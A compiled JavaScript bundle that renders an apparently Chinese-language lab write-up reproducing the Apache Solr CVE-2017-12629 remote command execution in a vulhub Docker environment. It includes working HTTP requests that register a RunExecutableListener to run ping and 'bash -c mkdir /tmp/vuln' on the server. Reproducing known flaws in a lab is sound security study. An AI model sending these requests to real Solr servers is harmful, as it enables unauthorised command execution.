{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[93],{1597:function(s,t,a){s.exports=a.p+\"assets/img/ec27d0b9-f86d-43b7-9fe4-1bba02cbf334.c9f3cf35.png\"},1598:function(s,t,a){s.exports=a.p+\"assets/img/image-20220307151501330.e8d1148f.png\"},1599:function(s,t,a){s.exports=a.p+\"assets/img/53ffedcf-5cc3-42cf-9623-a076ed001ac8.64629bac.png\"},1600:function(s,t,a){s.exports=a.p+\"assets/img/567692f5-4845-439f-b747-020011068da8.276f5ada.png\"},2090:function(s,t,a){\"use strict\";a.r(t);var n=a(56),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":s.$parent.slotKey}},[n(\"h1\",{attrs:{id:\"apache-solr-rce-远程命令执行漏洞-cve-2017-12629\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#apache-solr-rce-远程命令执行漏洞-cve-2017-12629\"}},[s._v(\"#\")]),s._v(\" Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629\")]),s._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞描述\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[s._v(\"#\")]),s._v(\" 漏洞描述\")]),s._v(\" \"),n(\"p\",[s._v(\"Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。\")]),s._v(\" \"),n(\"h2\",{attrs:{id:\"影响版本\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#影响版本\"}},[s._v(\"#\")]),s._v(\" 影响版本\")]),s._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[s._v(\"Apache Solr < 7.1\")]),n(\"br\"),s._v(\" \"),n(\"h2\",{attrs:{id:\"环境搭建\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#环境搭建\"}},[s._v(\"#\")]),s._v(\" 环境搭建\")]),s._v(\" \"),n(\"div\",{staticClass:\"language-shell extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[n(\"code\",[n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"git\")]),s._v(\" clone https://github.com/vulhub/vulhub.git\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" vulhub/solr/CVE-2017-12629\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"docker-compose\")]),s._v(\" build\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"docker-compose\")]),s._v(\" up -d\\n\")])])]),n(\"h2\",{attrs:{id:\"漏洞复现\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[s._v(\"#\")]),s._v(\" 漏洞复现\")]),s._v(\" \"),n(\"p\",[s._v(\"先请求url地址获取 core 内容\")]),s._v(\" \"),n(\"div\",{staticClass:\"language-shell extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[n(\"code\",[s._v(\"/solr/admin/cores\\n\")])])]),n(\"p\",[s._v(\"通过查看代码，能够触发命令执行的事件有两个：\"),n(\"code\",[s._v(\"postCommit\")]),s._v(\" 和\"),n(\"code\",[s._v(\"newSearcher\")])]),s._v(\" \"),n(\"p\",[n(\"img\",{attrs:{src:a(1597),alt:\"ec27d0b9-f86d-43b7-9fe4-1bba02cbf334\"}})]),s._v(\" \"),n(\"p\",[s._v(\"第一个请求包用于载入缓存中\")]),s._v(\" \"),n(\"div\",{staticClass:\"language- extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[n(\"code\",[s._v(\"exe : ping  执行的命令\\ndir: 命令存在的目录位置\\nargs:命令参数\\n\")])])]),n(\"p\",[s._v(\"如下请求包执行的是 /bin/ping 1.1.1.1\")]),s._v(\" \"),n(\"div\",{staticClass:\"language-shell extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[n(\"code\",[s._v(\"POST /solr/demo/config HTTP/1.1\\nHost: xxx.xxx.xxx.xxx:8983\\nConnection: close\\nContent-Type: application/json  \\nContent-Length: \"),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"198\")]),s._v(\"\\n\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"\\n  \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"add-listener\"')]),s._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),s._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"event\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"postCommit\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"name\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"newlistener-1\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"class\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"solr.RunExecutableListener\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"exe\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"ping\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dir\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/bin/\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"args\"')]),s._v(\":\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"1.1.1.1\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n  \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\"\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\"\\n\")])])]),n(\"p\",[n(\"img\",{attrs:{src:a(1598),alt:\"image-20220307151501330\"}})]),s._v(\" \"),n(\"p\",[s._v(\"第二个请求包用于更新缓存并执行命令\")]),s._v(\" \"),n(\"div\",{staticClass:\"language-shell extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[n(\"code\",[s._v(\"POST /solr/demo/update\\n\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"id\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"test\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\")])])]),n(\"p\",[s._v(\"进入docker容器查看发现命令已经执行\")]),s._v(\" \"),n(\"p\",[n(\"img\",{attrs:{src:a(1599),alt:\"53ffedcf-5cc3-42cf-9623-a076ed001ac8\"}})]),s._v(\" \"),n(\"p\",[s._v(\"使用 newSearcher可以直接加载入缓存执行命令\")]),s._v(\" \"),n(\"div\",{staticClass:\"language-shell extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[n(\"code\",[s._v(\"POST /solr/demo/config HTTP/1.1\\nHost: xxx.xxx.xxx.xxx:8983\\nConnection: close\\nContent-Type: application/json  \\nContent-Length: \"),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"198\")]),s._v(\"\\n\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"\\n  \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"add-listener\"')]),s._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),s._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"event\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"newSearcher\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"name\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"newlistener-2\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"class\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"solr.RunExecutableListener\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"exe\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"bash\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dir\"')]),n(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/bin/\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"args\"')]),s._v(\":\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"\\n         \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"-c\"')]),s._v(\",\\n         \"),n(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"mkdir /tmp/vuln\"')]),s._v(\",\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n  \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\"\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\"\\n\")])])]),n(\"p\",[s._v(\"成功执行了创建文件的命令\")]),s._v(\" \"),n(\"p\",[n(\"img\",{attrs:{src:a(1600),alt:\"567692f5-4845-439f-b747-020011068da8\"}})]),s._v(\" \"),n(\"p\",[s._v(\"如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测\")])],1)}),[],!1,null,null,null);t.default=e.exports}}]);","extractedComments":[]}